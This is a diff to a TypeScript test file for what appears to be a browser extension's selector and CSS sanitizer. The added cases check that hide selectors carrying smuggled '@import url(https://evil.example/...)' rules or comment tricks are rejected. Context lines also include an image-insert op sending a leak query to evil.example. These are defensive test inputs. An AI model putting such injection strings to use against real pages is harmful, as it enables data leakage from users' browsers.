@@ -92,6 +92,34 @@ const inl = (name: string, css: string, bad: RegExp[], good: string[] = []) => {
 inl('inline url leak', 'color:red;background:url(https://evil.example/p)', [/evil/], ['color:red']);
 inl('inline escaped', 'background:u' + BS + '72l(https://evil.example/p)', [/evil/]);
 inl('inline ok', 'color:red;padding:4px', [], ['color:red', 'padding:4px']);
+// ---- H1 (fable review): a hide selector must be a real selector list and nothing else
+import { isSafeSelector } from '../src/shared/validate';
+const sel = (name: string, s: string, want: boolean) => { const got = isSafeSelector(s); if (got !== want) { fail++; console.log('FAIL selector', name, JSON.stringify(s), 'got', got); } else console.log('ok   selector', name); };
+sel('@import smuggled via an unterminated comment', '@import url(https://evil.example/x.css) /*', false);
+sel('@import with a closed comment', '@import url(https://evil.example/x.css) /* x */', false);
+sel('plain @import', '@import "https://evil.example/x.css"', false);
+sel('@font-face', '@font-face', false);
+sel('comment opener', 'a /* b', false);
+sel('comment closer', 'a */ b', false);
+sel('braces', 'a{}', false);
+sel('semicolon', 'a;b', false);
+sel('html', '<script>', false);
+sel('not a selector at all', '!!!', false);
+sel('empty', '', false);
+sel('too long', 'a'.repeat(300), false);
+sel('non-string', undefined as unknown as string, false);
+sel('id', '#ad', true);
+sel('class + descendant', '.sidebar > .ad-slot', true);
+sel('custom element', 'ytd-rich-item-renderer', true);
+sel('attribute with a url inside the value', 'a[href^="https://example.com/x"]', true);
+sel('attribute with double slash', 'a[href*="//"]', true);
+sel('pseudo-classes and :has', 'li:has(> a):not(.x)', true);
+sel('selector list', 'h1, h2, .title', true);
+sel('Tailwind-style escaped class', '.md\\:flex', true);
+sel('Tailwind fraction class', '.w-1\\/2', true);
+sel('pseudo-element', 'a::before', true);
+const smuggle = sanitizeOps([{ op: 'hide', selector: '@import url(https://evil.example/x.css) /*' }, { op: 'hide', selector: '#ok' }, { op: 'setText', selector: '@import x /*', text: 'a' }, { op: 'move', selector: '#a', target: '@import x /*', position: 'beforeend' }]);
+if (smuggle.length !== 1 || (smuggle[0] as any).selector !== '#ok') { fail++; console.log('FAIL ops: smuggled selectors must be dropped, valid ones kept', JSON.stringify(smuggle)); } else console.log('ok   ops: smuggled selectors dropped in every op type');
 console.log('--- ops');
 const ops = sanitizeOps([
   { op: 'insert', target: 'body', position: 'beforeend', tag: 'img', src: 'https://evil.example/leak?x=1' },
